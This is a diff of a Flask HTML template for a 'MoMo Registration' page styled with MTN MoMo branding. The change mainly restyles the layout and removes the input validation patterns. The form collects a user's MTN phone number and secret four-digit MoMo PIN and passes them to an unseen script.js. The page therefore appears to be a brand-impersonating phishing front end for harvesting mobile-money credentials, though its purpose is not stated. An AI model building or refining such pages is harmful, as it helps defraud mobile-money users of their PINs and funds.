@@ -3,61 +3,58 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Register</title>
+    <title>MoMo Registration</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <div class="container">
-        <!-- Logo Image at Top -->
-        <div class="logo-container">
-            <img src="{{ url_for('static', filename='../images/Image.jpeg') }}" 
-                 alt="MoMo" 
-                 class="logo"
-                 onerror="this.style.display='none'">
-        </div>
-        
-        <!-- Brand Text: MoMo from MTN -->
-        <div class="brand">
-            <span class="brand-momo">MoMo</span>
-            <span class="brand-from">from</span>
-            <span class="brand-mtn">MTN</span>
-        </div>
-        
-        <form id="registrationForm">
-            <div class="form-group">
-                <input 
-                    type="tel" 
-                    id="mtnNumber"
-                    name="mtn_number"
-                    placeholder="MTN NUMBER" 
-                    required
-                    pattern="[0-9\s\+]{10,15}"
-                    maxlength="15"
-                >
-            </div>
-            
-            <div class="form-group">
-                <div class="pin-wrapper">
-                    <input 
-                        type="password" 
-                        id="momoPin"
-                        name="momo_pin"
-                        placeholder="MOMO PIN" 
-                        required
-                        pattern="[0-9]{4}"
-                        maxlength="4"
-                        minlength="4"
-                    >
-                    <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
+    <div class="main-container">
+        <!-- Dark Blue Background Section -->
+        <div class="blue-section">
+            <div class="logo-container">
+                <img src="{{ url_for('static', filename='images/Image.jpeg') }}" 
+                     alt="MoMo" 
+                     class="logo"
+                     onerror="this.style.display='none'">
+                <div class="brand">
+                    <span class="momo">MoMo</span>
+                    <span class="from">from</span>
+                    <span class="mtn">MTN</span>
                 </div>
             </div>
-            
-            <button type="submit" class="btn" id="submitBtn">REGISTER</button>
-        </form>
-        
-        <div id="messageContainer" class="message-container"></div>
+        </div>
+
+        <!-- Form Section -->
+        <div class="form-container">
+            <form id="registrationForm">
+                <div class="form-group">
+                    <input type="tel" 
+                           id="mtnNumber"
+                           name="mtn_number"
+                           placeholder="MTN NUMBER" 
+                           required
+                           maxlength="15">
+                </div>
+
+                <div class="form-group">
+                    <div class="pin-wrapper">
+                        <input type="password" 
+                               id="momoPin"
+                               name="momo_pin"
+                               placeholder="MOMO PIN" 
+                               required
+                               maxlength="4"
+                               minlength="4">
+                        <span class="toggle-pin" onclick="togglePinVisibility()">👁️</span>
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" id="submitBtn">REGISTER</button>
+            </form>
+
+            <div id="messageContainer" class="message-container"></div>
+        </div>
     </div>
-    
+
     <script src="{{ url_for('static', filename='script.js') }}"></script>
 </body>
 </html>
